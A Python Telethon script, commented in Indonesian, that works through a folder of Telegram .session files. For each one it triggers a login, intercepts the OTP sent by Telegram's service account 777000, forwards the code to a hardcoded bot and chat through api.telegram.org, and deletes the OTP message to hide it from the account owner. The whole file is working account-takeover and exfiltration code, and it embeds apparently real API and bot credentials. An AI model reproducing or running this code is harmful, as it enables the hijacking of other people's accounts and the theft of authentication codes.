import os
import asyncio
import re
import time
from telethon import TelegramClient, events, errors
import requests

# == Konfigurasi Anda ==
API_ID = 23416622            # Ganti dengan API ID kamu
API_HASH = 'd1bc12a03ea26416b38b4616a36112b0'    # Ganti dengan API HASH kamu
BOT_TOKEN = '7961891403:AAE8sydM_elnN_J8uoGLQ1urCecoCDxPHdY'
CHAT_ID = '7763955214'   # ID user Telegram kamu (bukan username)
SESSION_FOLDER = '.'       # Folder tempat file .session

# == Kirim pesan ke Telegram Bot ==
def kirim_ke_bot(pesan):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {'chat_id': CHAT_ID, 'text': pesan}
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Gagal kirim ke bot:", e)

# == Deteksi apakah file .session valid SQLite ==
def is_valid_sqlite(path):
    try:
        with open(path, 'rb') as f:
            return f.read(16).startswith(b'SQLite format 3')
    except:
        return False

# == Ambil nomor dari session file ==
def extract_number(session_filename):
    return session_filename.replace('.session', '')

# == Proses OTP untuk satu session ==
async def proses_session(session_file):
    nomor = extract_number(session_file)
    print(f"[PROCESS] {nomor}")
    path = os.path.join(SESSION_FOLDER, session_file)

    if not is_valid_sqlite(path):
        print(f"[CORRUPT] {session_file}")
        return

    client = TelegramClient(path, API_ID, API_HASH)
    try:
        await client.start(phone=nomor)  # langsung minta OTP
        print(f"[OTP SENT] OTP dikirim ke {nomor}")
        kirim_ke_bot(f"📲 OTP diminta ke nomor: {nomor}")

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp_match = re.search(r'(\d{5})', event.message.message)
            if otp_match:
                otp = otp_match.group(1)
                msg = f"✅ OTP untuk {nomor}: `{otp}`"
                print(msg)
                kirim_ke_bot(msg)

                # Hapus pesan dari 777000 (opsional)
                try:
                    await event.message.delete()
                    print(f"[DELETED] Pesan OTP dari 777000 dihapus.")
                except:
                    print("[INFO] Gagal hapus pesan 777000.")

                await client.disconnect()

        print(f"[WAITING] Menunggu OTP dari 777000 untuk {nomor}...")
        await client.run_until_disconnected()

    except errors.PhoneNumberInvalidError:
        print(f"[INVALID] Nomor tidak valid: {nomor}")
        kirim_ke_bot(f"❌ Nomor tidak valid: {nomor}")
    except Exception as e:
        print(f"[ERROR] {nomor} -> {e}")
        kirim_ke_bot(f"⚠️ Error untuk {nomor}: {e}")
    finally:
        await client.disconnect()

# == MAIN ==
async def main():
    session_files = [f for f in os.listdir(SESSION_FOLDER) if f.endswith('.session')]
    for session_file in session_files:
        await proses_session(session_file)
        print("-" * 40)
        time.sleep(3)  # Delay antar akun untuk hindari rate-limit

asyncio.run(main())
